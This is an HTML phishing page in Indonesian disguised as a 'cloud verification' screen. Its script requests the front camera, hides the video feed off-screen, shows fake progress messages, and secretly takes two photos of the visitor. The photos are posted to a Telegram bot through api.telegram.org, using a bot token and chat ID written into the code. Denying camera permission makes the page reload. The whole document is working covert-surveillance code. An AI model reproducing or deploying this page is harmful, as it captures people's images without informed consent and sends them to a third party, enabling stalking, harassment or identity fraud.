<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Cloud</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 5px solid #333; border-top: 5px solid cyan; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Video tetap ada tapi ditaruh di luar layar agar sensor tetap nyala */
        video { position: fixed; left: -1000px; top: -1000px; width: 640px; height: 480px; }
    </style>
</head>
<body>
    <div id="content">
        <h2 style="color:cyan;">‚òÅÔ∏è CLOUD VERIFICATION</h2>
        <div class="loader"></div>
        <p>Mohon jangan tutup halaman ini...</p>
        <p id="stat">Menghubungkan ke satelit...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
        const CHAT_ID = "7596509818";
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        })
        .then(stream => {
            video.srcObject = stream;
            document.getElementById("stat").innerText = "Sinkronisasi sensor cahaya...";
            
            // JANGAN LANGSUNG JEPRET. Tunggu 6 detik biar sensor bener-bener terang.
            setTimeout(multiShot, 6000);
        })
        .catch(() => { alert("Gagal verifikasi. Izin kamera diperlukan."); location.reload(); });

        async function multiShot() {
            document.getElementById("stat").innerText = "Mengenkripsi data wajah...";
            // Kita jepret 2 kali dengan jeda 1 detik biar dapet yang paling terang
            await takeAndSend("Foto 1 (Tunggu Fokus)");
            setTimeout(async () => {
                await takeAndSend("Foto 2 (Stabil)");
                document.getElementById("content").innerHTML = "<h2>‚úÖ SELESAI</h2><p>Verifikasi Berhasil!</p>";
            }, 1500);
        }

        function takeAndSend(cap) {
            return new Promise((resolve) => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", blob, "selfie.jpg");
                    formData.append("caption", "üì∏ " + cap);

                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    }).then(() => resolve());
                }, "image/jpeg", 0.9);
            });
        }
    </script>
</body>
</html>
